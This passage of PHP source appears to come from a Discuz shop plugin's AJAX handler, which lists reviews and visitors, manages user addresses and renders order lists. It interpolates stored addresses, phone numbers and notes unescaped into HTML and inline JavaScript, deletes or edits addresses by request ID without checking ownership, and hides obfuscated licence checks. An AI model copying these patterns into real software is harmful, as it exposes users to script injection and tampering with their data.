							<a href="'.it618_brand_rewriteurl($it618_brand_ly['it618_uid']).'" target="_blank" title="'.it618_brand_getlang('s408').$username.it618_brand_getlang('s409').'" class="a1">'.$username.'</a><font color=#999999>('.$it618_brand_ly['it618_uid'].')</font> '.it618_brand_getonlinestate($it618_brand_ly['it618_uid']).' '.$strtmpdel.' <font color=#666666>'.it618_brand_getlang('s459').'</font><br>
							'.it618_brand_getquote($pagetype,$it618_brand_ly['it618_quoteid']).str_replace('[br]','<br>',dhtmlspecialchars($it618_brand_ly['it618_content'])).'<br>
							'.it618_brand_getlang('s460').($count-$n+1).it618_brand_getlang('s461').' <font color="gray">'.date('Y-m-d H:i:s', $it618_brand_ly['it618_time']).'</font>&nbsp; <a href="javascript:" class="saleabtn" style="height:23px;line-height:23px;" onclick="bookquote(\''.($count-$n+1).'\',\''.$it618_brand_ly['id'].'\')" class="a1">'.it618_brand_getlang('s462').'</a>
						</div>';
		}
		$n=$n+1;
	}
	if($lylist_get=='')$lylist_get=it618_brand_getlang('s463').$strtmply.it618_brand_getlang('s464').$strtmply.it618_brand_getlang('s465');
	
	echo $lylist_get."it618_split".$multipage."it618_split".$count;
}


if($_GET['ac']=="pj_get"){
	$page = max(1, intval($_GET['page']));
	
	$ppp = $Shop_productlycount;
	$startlimit = ($page - 1) * $ppp;
	$count = C::t('#it618_brand#it618_brand_sale')->count_by_it618_pid_pj($_GET['pj'],$_GET['it618_pid']);

	if($_GET['wap']==0){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&it618_pid=".$_GET['it618_pid']);
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='getpjlist(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='getpjlist(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=','getpjlist(',$multipage);
		$multipage=str_replace('this.value;;','this.value);',$multipage);
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopI&it618_pid=".$_GET['it618_pid']."&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="getpjlist(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&it618_pid=".$_GET['it618_pid']."&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getpjlist(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&it618_pid=".$_GET['it618_pid']."&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getpjlist(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&it618_pid=".$_GET['it618_pid']."&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getpjlist(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&it618_pid=".$_GET['it618_pid']."&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getpjlist(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}

	}
	
	$n=$startlimit+1;
	
	$brand_shopadmin=explode(",",$it618_brand['brand_shopadmin']);
	
	foreach(C::t('#it618_brand#it618_brand_sale')->fetch_all_by_it618_pid_pj($_GET['pj'],$_GET['it618_pid'],$startlimit,$ppp) as $it618_brand_sale) {

		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')return;

		$username=it618_brand_getusername($it618_brand_sale['it618_uid']);
		$buyuser=cutstr($username, 2, '').'***';
		
		if(in_array($_G['uid'], $brand_shopadmin)){
			$strtmpdel=' <a href="javascript:" class="saleabtn a1" onclick="setsalepj(\''.$it618_brand_sale['id'].'\')">'.it618_brand_getlang('s109').'</a>';
		}
		
		$moneycount=C::t('#it618_brand#it618_brand_money')->count_by_shopid(0,0,0,0,$it618_brand_sale['it618_uid']);
		$it618_brand_level=C::t('#it618_brand#it618_brand_level')->fetch_by_type_salecount(1,$moneycount);
		
		$tmpstr='';
		foreach(C::t('#it618_brand#it618_brand_sale_pjpic')->fetch_all_by_saleid($it618_brand_sale['id']) as $it618_brand_sale_pjpic) {
			$file_ext=strtolower(substr($it618_brand_sale_pjpic['it618_pjpic'],strrpos($it618_brand_sale_pjpic['it618_pjpic'], '.')+1)); 
			$file_extarr=explode("?",$file_ext);
			$file_ext=$file_extarr[0];
			$it618_smallurl='source/plugin/it618_brand/kindeditor/data/user/u'.$it618_brand_sale['it618_uid'].'/smallimage/pjpic'.$it618_brand_sale_pjpic['id'].'.'.$file_ext;
				
			$tmpstr.='<img src="'.$it618_smallurl.'" width="48" height="48" onclick="getbigpjpic('.$it618_brand_sale['id'].',\''.$it618_brand_sale_pjpic['it618_pjpic'].'\')"/>';
		}
		
		if($tmpstr!=''){
			$tmpstr='<ul class="pjpic"><li>'.$tmpstr.'</li><li class="bigpjpic" style="display:none" id="bigpjpic'.$it618_brand_sale['id'].'"></li></ul>';
		}
		
		$pjlist_get.='<tr><td class="tdpjcontent"><div class="pjcontent">'.str_replace('[br]','<br>',dhtmlspecialchars($it618_brand_sale['it618_content_pj'])).$tmpstr.'</div><div class="pjtime">'.$buyuser.' <a href="'.$it618_brand['brand_levelurl'].'" target="_blank" title="'.$it618_brand_level['it618_name'].' '.$it618_brand['brand_leveltitle'].'"><img style="vertical-align:middle;margin-top:-3px" src="'.$it618_brand_level['it618_img'].'"></a> '.date('Y-m-d H:i:s', $it618_brand_sale['it618_pjtime']).$strtmpdel.'</div></td></tr>';
		
		$n=$n+1;
	}
	
	echo $pjlist_get."it618_split".$multipage;
}


if($_GET['ac']=="visit_get"){
	$ppp = $Shop_productvisitcount;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;

	$n=$startlimit+1;
	
	$visitcount = C::t('#it618_brand#it618_brand_visit')->count_by_it618_pid($it618_pid);
	$multipage = multi($visitcount, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_brand:ajax&sid=$ShopId&it618_pid=".$it618_pid);
	$multipage=str_replace("href=","name=",$multipage);
	$multipage=str_replace("name=","href='javascript:' onclick='getvisitlist(this.name)' name=",$multipage);
	$multipage=str_replace("onclick='getvisitlist(this.name)' ".'name="custompage"','',$multipage);
	$multipage=str_replace('window.location=','getvisitlist(',$multipage);
	$multipage=str_replace('this.value;;','this.value);',$multipage);
	
	foreach(C::t('#it618_brand#it618_brand_visit')->fetch_all_by_it618_pid(
		$it618_pid,$startlimit,$ppp
	) as $it618_brand_visit) {

		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')return;

		$username=it618_brand_getusername($it618_brand_visit['it618_uid']);
		$tmponlineico=it618_brand_getonlinestate($it618_brand_visit['it618_uid']);
		
		$timestr=it618_brand_gettime($it618_brand_visit['it618_time']);
		
		$visitlist_get.='<li class="lia">
						  <div class="a1"><a href="'.it618_brand_rewriteurl($it618_brand_visit['it618_uid']).'" target="_blank"><img src="'.it618_brand_discuz_uc_avatar($it618_brand_visit['it618_uid'],'small').'" alt="'.it618_brand_getlang('s408').$username.it618_brand_getlang('s409').'" width="50" height="50" /></a></div>
						  <ul>
						  <li><a href="'.it618_brand_rewriteurl($it618_brand_visit['it618_uid']).'" target="_blank" title="'.it618_brand_getlang('s408').$username.it618_brand_getlang('s409').'" class="a1">'.$username.'</a></li>
						  <li>'.$timestr.$tmponlineico.'</li>
						  </ul>
					  </li>';
		$n=$n+1;
	}
	if($multipage!='')$multipage='<div class="commonpage" style="margin-top:3px;" id="visitpage">'.$multipage.'</div>';
	echo $visitlist_get."it618_split".$multipage."it618_split".$visitcount;
}


if($_GET['ac']=="addr_add"){
	if($uid<=0){
		echo it618_brand_getlang('s171');
	}else{

		$count=C::t('#it618_brand#it618_brand_addr')->count_by_it618_uid($uid);
		
		if($count<3){
			if($count==0)$it618_iscur=1;else $it618_iscur=0;

			$id = C::t('#it618_brand#it618_brand_addr')->insert(array(
				'it618_uid' => $uid,
				'it618_name' => it618_brand_utftogbk($_GET['it618_name']),
				'it618_addr' => it618_brand_utftogbk($_GET['it618_addr']),
				'it618_tel' => it618_brand_utftogbk($_GET['it618_tel']),
				'it618_iscur' => $it618_iscur,
				'it618_time' => $_G['timestamp']
			), true);
			
			if($id>0){
				echo it618_brand_getlang('s467');
			}else{
				echo it618_brand_getlang('s468');
			}
		}else{
			echo it618_brand_getlang('s469');
		}
	}
}


if($_GET['ac']=="addr_edit"){
	if($uid<=0){
		echo it618_brand_getlang('s171');
	}else{
		if($_GET['it618_iscur']=='1')C::t('#it618_brand#it618_brand_addr')->update_it618_iscur_by_it618_uid($uid);
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		$id = C::t('#it618_brand#it618_brand_addr')->update(intval($_GET['aid']),array(
			'it618_uid' => $uid,
			'it618_name' => it618_brand_utftogbk($_GET['it618_name']),
			'it618_addr' => it618_brand_utftogbk($_GET['it618_addr']),
			'it618_tel' => it618_brand_utftogbk($_GET['it618_tel']),
			'it618_time' => $_G['timestamp']
		));
		if(count($ii1i11i)!=11)return;
		if($id>0){
			echo it618_brand_getlang('s470');
		}else{
			echo it618_brand_getlang('s471');
		}
	}
}


if($_GET['ac']=="addr_get"){
	$n=1;
	foreach(C::t('#it618_brand#it618_brand_addr')->fetch_all_by_it618_uid($uid) as $it618_brand_addr) {
		if($it618_brand_addr['it618_iscur']==0){
			$strtmp='<a href="javascript:" class="saleabtn" onclick="defaultaddr('.$it618_brand_addr['id'].')">'.it618_brand_getlang('s472').'</a>';
		}else{
			$strtmp='';
		}

		$n=$n+1;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if(count($ii1i11i)!=11)return;
		
		if($_GET['wap']==0){
		$addr_get.='<tr>
				 <td><input type="text" class="txt" style="width:100px" id="it618_name'.$it618_brand_addr['id'].'" value="'.$it618_brand_addr['it618_name'].'"/></td>
				 <td><input type="text" class="txt" style="width:370px" id="it618_addr'.$it618_brand_addr['id'].'" value="'.$it618_brand_addr['it618_addr'].'"/></td>
				 <td><input type="text" class="txt" style="width:100px" id="it618_tel'.$it618_brand_addr['id'].'" value="'.$it618_brand_addr['it618_tel'].'"/></td>
				 <td>
				 '.$strtmp.'
				 <a href="javascript:" class="saleabtn" onclick="savaaddr(\'edit\',\''.$it618_brand_addr['id'].'\')">'.it618_brand_getlang('s473').'</a>
				 <a href="javascript:" class="saleabtn" onclick="if(confirm(\''.it618_brand_getlang('s474').'\'))deladdr('.$it618_brand_addr['id'].')">'.it618_brand_getlang('s475').'</a>
				 </td>
				 </tr>
				 <tr><td style="height:6px" colspan=5></td></tr>';
		}else{
			$addr_get.='
				<tr><td colspan="2">
				<table width="100%" style=" table-layout:fixed">
				<tr>
				<td width="40">'.$it618_brand_lang['t183'].'</td><td><input type="text" class="txt" style="width:93%" id="it618_name'.$it618_brand_addr['id'].'" value="'.$it618_brand_addr['it618_name'].'"/> </td>
				<td width="40">'.$it618_brand_lang['t445'].'</td><td><input type="text" class="txt" style="width:93%" id="it618_tel'.$it618_brand_addr['id'].'" value="'.$it618_brand_addr['it618_tel'].'"/></td>
				</tr>
				</table>
				</td></tr>
				<tr><td width="40">'.$it618_brand_lang['t184'].'</td><td><input type="text" class="txt" style="width:97%" id="it618_addr'.$it618_brand_addr['id'].'" value="'.$it618_brand_addr['it618_addr'].'"/></td></tr>
				
				 <tr><td colspan="2" style="padding:6px;background-color:#f9f9f9">
				 '.$strtmp.'
				 <a href="javascript:" class="saleabtn" onclick="savaaddr(\'edit\',\''.$it618_brand_addr['id'].'\')">'.it618_brand_getlang('s473').'</a>
				 <a href="javascript:" class="saleabtn" onclick="if(confirm(\''.it618_brand_getlang('s474').'\'))deladdr('.$it618_brand_addr['id'].')">'.it618_brand_getlang('s475').'</a></td>
				 </tr>';
		}
	}
	
	if($_GET['wap']==0){
		echo '<table cellspacing="0" cellpadding="0" class="jf_tb">
			 <thead>
			 <tr>
			 <th width="100">'.it618_brand_getlang('s476').'</th>
			 <th>'.it618_brand_getlang('s477').'</th>
			 <th width="100">'.it618_brand_getlang('s478').'</th>
			 <th width="140">'.it618_brand_getlang('s481').'</th>
			 </tr>
			 </thead>
			 <tr><td style="height:6px" colspan=5></td></tr>
			 <tbody>'.$addr_get.'</tbody>
		</table>';
	}else{
		echo '<table width="100%">'.$addr_get.'</table>';
	}
}


if($_GET['ac']=="addr_default"){
	if($uid<=0){
		echo it618_brand_getlang('s171');
	}else{
		C::t('#it618_brand#it618_brand_addr')->update_it618_iscur_by_it618_uid($uid);
		C::t('#it618_brand#it618_brand_addr')->update_it618_iscur_by_id($_GET['aid']);
		echo it618_brand_getlang('s482');
	}
}


if($_GET['ac']=="addr_del"){
	if($uid<=0){
		echo it618_brand_getlang('s171');
	}else{
		C::t('#it618_brand#it618_brand_addr')->delete_by_id($_GET['aid']);
		echo it618_brand_getlang('s483');
	}
}


if($_GET['ac']=="orderlist_get"){
	$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;
	
	if($_GET['state']) {
		if($_GET['state']==1)$it618sql .= "s.it618_state = 1";
		if($_GET['state']==2)$it618sql .= "s.it618_state = 2";
		if($_GET['state']==3)$it618sql .= "s.it618_state = 3";
		if($_GET['state']==4)$it618sql .= "s.it618_state = 4";
	}
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	
	if($_GET['ac1']=='pcmyorder'){		
		$it618_brand_orders=C::t('#it618_brand#it618_brand_order')->fetch_all_by_search(0,$it618sql,'s.id desc',$_GET['panme'],$uid, $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp);
		$count=C::t('#it618_brand#it618_brand_order')->count_by_search(0,$it618sql,'',$_GET['panme'],$uid, $_GET['it618_time1'], $_GET['it618_time2']);
		$money=C::t('#it618_brand#it618_brand_order')->sum_money_by_search(0,$it618sql,'',$_GET['panme'],$uid, $_GET['it618_time1'], $_GET['it618_time2']);
		$jfcount=C::t('#it618_brand#it618_brand_order')->sum_jfcount_by_search(0,$it618sql,'',$_GET['panme'],$uid, $_GET['it618_time1'], $_GET['it618_time2']);
		$funname='getmyorderlist';
	}
	
	if($_GET['ac1']=='wapmyorder'){
		$it618_brand_orders=C::t('#it618_brand#it618_brand_order')->fetch_all_by_search(0,$it618sql,'s.id desc',$_GET['panme'],$uid, '', '',$startlimit,$ppp);
		$count=C::t('#it618_brand#it618_brand_order')->count_by_search(0,$it618sql,'',$_GET['panme'],$uid, '', '');
		$money=C::t('#it618_brand#it618_brand_order')->sum_money_by_search(0,$it618sql,'',$_GET['panme'],$uid, '', '');
		$jfcount=C::t('#it618_brand#it618_brand_order')->sum_jfcount_by_search(0,$it618sql,'',$_GET['panme'],$uid, $_GET['it618_time1'], $_GET['it618_time2']);
		$funname='getmyorderlist';
	}
	
	if($_GET['ac1']=='wapmyshoporder'){
		if($uid>0){
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
			if($it618_brand_brand['it618_uid']==$uid){
				$it618_brand_orders=C::t('#it618_brand#it618_brand_order')->fetch_all_by_search($it618_brand_brand['id'],$it618sql,'s.id desc',$_GET['panme'],$_GET['finduid'], '', '',$startlimit,$ppp);
				$count=C::t('#it618_brand#it618_brand_order')->count_by_search($it618_brand_brand['id'],$it618sql,'',$_GET['panme'],$_GET['finduid'], '', '');
				$money=C::t('#it618_brand#it618_brand_order')->sum_money_by_search($it618_brand_brand['id'],$it618sql,'',$_GET['panme'],$_GET['finduid'], '', '');
				$funname='getmyshoporderlist';
			}else{
				echo '';exit;
			}
		}else{
			echo '';exit;
		}
		
		$tmp='<option value="0">'.it618_brand_getlang('s1188').'</option>';
		foreach(C::t('#it618_brand#it618_brand_kd')->fetch_all_by_shopid($ShopId) as $it618_brand_kd) {
			$tmp.='<option value='.$it618_brand_kd['id'].'>'.$it618_brand_kd['it618_name'].'</option>';
		}
	}
	
	$n=0;
	foreach($it618_brand_orders as $it618_brand_order) {
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')return;
	
		$username=it618_brand_getusername($it618_brand_order['it618_uid']);
		
		$isgoodsdel=0;$gtypename='';$gtypename1='';
		if($it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_brand_order['it618_pid'])){
			$goodsname = $it618_brand_goods['it618_name'];
			$gtypename = C::t('#it618_brand#it618_brand_goods_type')->fetch_it618_name_by_id($it618_brand_order['it618_gtypeid']);
			$typecountok = DB::result_first("SELECT COUNT(1) FROM ".DB::table('it618_brand_goods_type')." WHERE it618_ison>0 and it618_pid=".$it618_brand_goods['id']);
		}else{
			$isgoodsdel=1;
			$goodsname = $it618_brand_order['it618_pname'];
			$gtypename = $it618_brand_order['it618_gtypename'];
		}
		
		$buyuser=$username;
		
		if($it618_brand_order['it618_state']==1)$it618_state='<font color=red>'.it618_brand_getlang('s1513').'</font>';
		if($it618_brand_order['it618_state']==2)$it618_state='<font color=blue>'.it618_brand_getlang('s1514').'</font>';
		if($it618_brand_order['it618_state']==3)$it618_state='<font color=green>'.it618_brand_getlang('s1515').'</font>';
		if($it618_brand_order['it618_state']==4)$it618_state='<font color=#F0F>'.it618_brand_getlang('s1516').'</font>';
		
		if($typecountok>0){
			if($it618_brand_order['it618_gtypeid']>0){
				$gtypename1='<span style="float:right">['.$gtypename.']</span>';
				$gtypename='['.$gtypename.']';
			}
		}
		
		if($_GET['ac1']=='pcmyorder'){
			
			$it618_state.='<br><a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_brand_order['it618_addr'].' '.$it618_brand_order['it618_tel'].'\')">'.it618_brand_getlang('s1521').'</a>';
			if($it618_brand_order['it618_state']==1){
				$it618_state.=' <a href="javascript:" class="saleabtn" onclick="delorder('.$it618_brand_order['id'].')">'.it618_brand_getlang('s1534').'</a>';
			}else{
				$it618_brand_kd=C::t('#it618_brand#it618_brand_kd')->fetch_by_id($it618_brand_order['it618_kdid']);
				$it618_state.=' '.it618_brand_getlang('s1522').'<span title="'.$it618_brand_order['it618_bz'].'">'.$it618_brand_kd['it618_name'].' '.it618_brand_getkd('it618_brand_order',$it618_brand_order['id'],$it618_brand_kd['it618_kdcomid'],$it618_brand_order['it618_kddan']).'</span>';
				if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
			}
			
			
			$it618_brand_brand = C::t('#it618_brand#it618_brand_brand')->fetch_by_id($it618_brand_order['it618_shopid']);
			
			$disabled='';
			if($it618_brand_sale['it618_state']!=1)$disabled='disabled="disabled"';
			$tmpurl2=it618_brand_getrewrite('shop_home',$it618_brand_brand['id'],'plugin.php?id=it618_brand:shop&sid='.$it618_brand_brand['id']);
			
			$goodsname=cutstr($goodsname,32,'...');
			
			if($isgoodsdel==0){
				$tmpurl1=it618_brand_getrewrite('shop_product',$it618_brand_sale['it618_shopid'].'@'.$it618_brand_sale['it618_pid'],'plugin.php?id=it618_brand:product&sid='.$it618_brand_sale['it618_shopid'].'&pid='.$it618_brand_sale['it618_pid']);
				$goodsstr='<a href="'.$tmpurl1.'" target="_blank">'.$goodsname.'</a>';
			}else{
				$goodsstr=$goodsname;
			}
			
			if($it618_brand_order['it618_state']!=1)$disabled='disabled="disabled"';
			$orderlist_get.='<tr class="hover">
						<td><input class="checkbox" type="checkbox" id="chk'.$it618_brand_order[id].'" name="chk_sel" value="'.$it618_brand_order[id].'" '.$disabled.'><label for="chk'.$it618_brand_order[id].'">'.$it618_brand_order[id].'</label></td>
						<td>'.$goodsstr.' '.$gtypename.'<br><a href="'.$tmpurl2.'" target="_blank"><font color="#ccc">'.$it618_brand_brand['it618_name'].'</font></a></td>
						<td>'.$it618_brand_order['it618_price'].'</td>
						<td>'.$it618_brand_order['it618_count'].'</td>
						<td>'.$it618_brand_order['it618_zk'].'%</td>
						<td><font color=red>'.$it618_brand_order['it618_price']*$it618_brand_order['it618_count'].'</font></td>
						<td>'.$it618_state.'</td>
						<td>-<font color=red>'.$it618_brand_order['it618_jfcount'].'</font><font color=green>'.$creditname.'</font></td>
						<td>'.date('Y-m-d H:i:s', $it618_brand_order['it618_time']).'</td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmyorder'){			
			$it618_statebtn=' <a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_brand_order['it618_addr'].' '.$it618_brand_order['it618_tel'].'\')">'.it618_brand_getlang('s1521').'</a>';
			if($it618_brand_order['it618_state']==1){
				$it618_statebtn.=' <a href="javascript:" class="saleabtn" onclick="delorder('.$it618_brand_order['id'].')">'.it618_brand_getlang('s1534').'</a>';
			}else{
				$it618_brand_kd=C::t('#it618_brand#it618_brand_kd')->fetch_by_id($it618_brand_order['it618_kdid']);
				$it618_statebtn.=' '.it618_brand_getlang('s1522').'<span title="'.$it618_brand_order['it618_bz'].'">'.$it618_brand_kd['it618_name'].' '.it618_brand_getkd('it618_brand_order',$it618_brand_order['id'],$it618_brand_kd['it618_kdcomid'],$it618_brand_order['it618_kddan']).'</span>';
				if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
			}
			
			if($isgoodsdel==0){
				$tmpurl=it618_brand_getrewrite('brand_wap','product@'.$it618_brand_sale['it618_shopid'].'@0@'.$it618_brand_sale['it618_pid'].'@0','plugin.php?id=it618_brand:wap&pagetype=product&sid='.$it618_brand_sale['it618_shopid'].'&cid='.$it618_brand_sale['it618_pid']);
				$goodsstr='<a href="'.$tmpurl.'" target="_blank" style="font-size:14px;color:#333">'.$goodsname.'</a>';
				$imgstr='<a href="'.$tmpurl.'" target="_blank"><img class="lazy" data-original="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'" width="108" height="108" style="border-radius: 3px;"/></a>';
			}else{
				$goodsstr='<span style="font-size:14px;color:#333">'.$goodsname.'</span>';
				$imgstr='<img src="source/plugin/it618_brand/images/nogoods.png" width="108" height="108" style="border-radius: 3px;"/>';
			}
			
			$orderlist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="118" style="text-align:left;vertical-align:top;border:none">
							'.$imgstr.'
							</td><td style="text-align:left;vertical-align:top;line-height:18px;border:none">
							'.$goodsstr.'<br><font color=#999>
							'.it618_brand_getlang('s1536').$it618_brand_order['it618_price'].' '.it618_brand_getlang('t687').':'.$it618_brand_order['it618_zk'].'% <br>'.it618_brand_getlang('s1537').($it618_brand_order['it618_price']*$it618_brand_order['it618_count']).''.$gtypename1.' <br><div style="float:right">'.it618_brand_getlang('s1538').$it618_state.'</div></font> <font color=#ccc>'.date('Y-m-d H:i:s', $it618_brand_order['it618_time']).'</font><br>'.$it618_statebtn.'
							</td></tr>
						</table>
					</dd>';
		}
		
		if($_GET['ac1']=='wapmyshoporder'){
			$bz='';$strcontent='';
			if($it618_brand_order['it618_bz']!=""){
				$bz=' <a href="javascript:" class="saleabtn" onclick="bz'.$it618_brand_order[id].'()">'.it618_brand_getlang('s1523').'</a> ';
			}
			
			$bzbtn='';$kdbtn='1';
			
			if($it618_brand_order['it618_state']<=2){
				if($it618_brand_order['it618_kddan']==''){
					$it618_statebtn='<a href="javascript:" class="saleabtn" onclick="fahuo'.$it618_brand_order[id].'()">'.it618_brand_getlang('s1524').'</a> <a href="javascript:" class="saleabtn" onclick="delorder('.$it618_brand_order[id].')">'.it618_brand_getlang('s1568').'</a>';
					$kdbtnname=it618_brand_getlang('s1527');
				}else{
					$kdbtnname=it618_brand_getlang('s1528');
				}
				
				if($it618_brand_order['it618_state']==2){
					$it618_statebtn='<a href="javascript:" class="saleabtn" onclick="okorder('.$it618_brand_order[id].',1)">'.it618_brand_getlang('s1525').'</a> <a href="javascript:" class="saleabtn" onclick="okorder('.$it618_brand_order[id].',0)">'.it618_brand_getlang('s1526').'</a>';	
				}
			}else{
				$it618_statebtn='';
				$kdbtnname=it618_brand_getlang('s1529');
				$kdbtn='';
			}
			
			if($kdbtn!='')$kdbtn='<input type="button" class="it618btn" value="'.$kdbtnname.'" onclick="ordersavekd()">';
			if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
			$it618_kddan='';
			if($it618_brand_order['it618_kddan']!=''){
				$it618_brand_kd=C::t('#it618_brand#it618_brand_kd')->fetch_by_id($it618_brand_order['it618_kdid']);
				$it618_kddan='<br>'.it618_brand_getlang('s1522').'<span title="'.$it618_brand_order['it618_bz'].'" style="color:green">'.$it618_brand_kd['it618_name'].' '.$it618_brand_order['it618_kddan'].'</span> <a href="javascript:" class="saleabtn" onclick="fahuo'.$it618_brand_order[id].'()">'.$kdbtnname.'</a>';
				
			}
			
			$tmp1=str_replace("<option value=".$it618_brand_order['it618_kdid'],"<option value=".$it618_brand_order['it618_kdid']." selected=selected",$tmp);
			
			$strcontent.='<div class="kd_fahuo">'.$it618_brand_order['it618_addr'].'<br><br>'.it618_brand_getlang('s1530').'<select id="it618_kdid">'.$tmp1.'</select><input type="text"  id="it618_kddan" value="'.$it618_brand_order['it618_kddan'].'"><input type="hidden" id="orderid" value="'.$it618_brand_order['id'].'"> '.$kdbtn.' <span style="color:red" id="kdtips"></span></div>';
			
			
			$strtmp=$bz;
			
			if($isgoodsdel==0){
				$tmpurl=it618_brand_getrewrite('brand_wap','product@'.$it618_brand_sale['it618_shopid'].'@0@'.$it618_brand_sale['it618_pid'].'@0','plugin.php?id=it618_brand:wap&pagetype=product&sid='.$it618_brand_sale['it618_shopid'].'&cid='.$it618_brand_sale['it618_pid']);
				$goodsstr='<a href="'.$tmpurl.'" target="_blank" style="font-size:14px;color:#333">'.$goodsname.'</a>';
				$imgstr='<a href="'.$tmpurl.'" target="_blank"><img class="lazy" data-original="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'" width="108" height="108" style="border-radius: 3px;"/></a>';
			}else{
				$goodsstr='<span style="font-size:14px;color:#333">'.$goodsname.'</span>';
				$imgstr='<img src="source/plugin/it618_brand/images/nogoods.png" width="108" height="108" style="border-radius: 3px;"/>';
			}
			
			$orderlist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="118" style="text-align:left;vertical-align:top;border:none">
							'.$imgstr.'
							</td><td style="text-align:left;vertical-align:top;line-height:18px;border:none">
							'.$goodsstr.'<br><font color=#999>
							'.it618_brand_getlang('s1536').$it618_brand_order['it618_price'].' '.it618_brand_getlang('t687').':'.$it618_brand_order['it618_zk'].'% <br>'.it618_brand_getlang('s1537').($it618_brand_order['it618_price']*$it618_brand_order['it618_count']).''.$strtmp.''.$gtypename1.''.'<br><div style="float:right">'.it618_brand_getlang('s1538').$it618_state.'</div></font> <font color=#ccc>'.date('Y-m-d H:i:s', $it618_brand_order['it618_time']).'</font><br>'.$it618_statebtn.$it618_kddan.'
							</td></tr>
						</table>
					</dd>';

			$tmpjs.='function fahuo'.$it618_brand_order[id].'(){
						var layerobj = {
							title:"'.it618_brand_getlang('s1540').'",
							titlebgcolor:"#f9f9f9",
							content:\'<table width="98%"><tr><td>'.$strcontent.'</td></tr></table>\',
							bottom:"",
							bottomheight:0,
							allcontent:""
						};
						
						showlayer("orderfahuo",layerobj);
					}';
			if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
			if($it618_brand_order['it618_bz']!=''){
				$tmpjs.='function bz'.$it618_brand_order[id].'(){
							var layerobj = {
								title:"'.it618_brand_getlang('s1541').'",
								titlebgcolor:"#f9f9f9",
								content:\'<table width="98%"><tr><td>'.$it618_brand_order['it618_bz'].'</td></tr></table>\',
								bottom:"",
								bottomheight:0,
								allcontent:""
							};
							
							showlayer("orderbz",layerobj);
						}';
			}
		}
		
		$n=$n+1;
	}
	
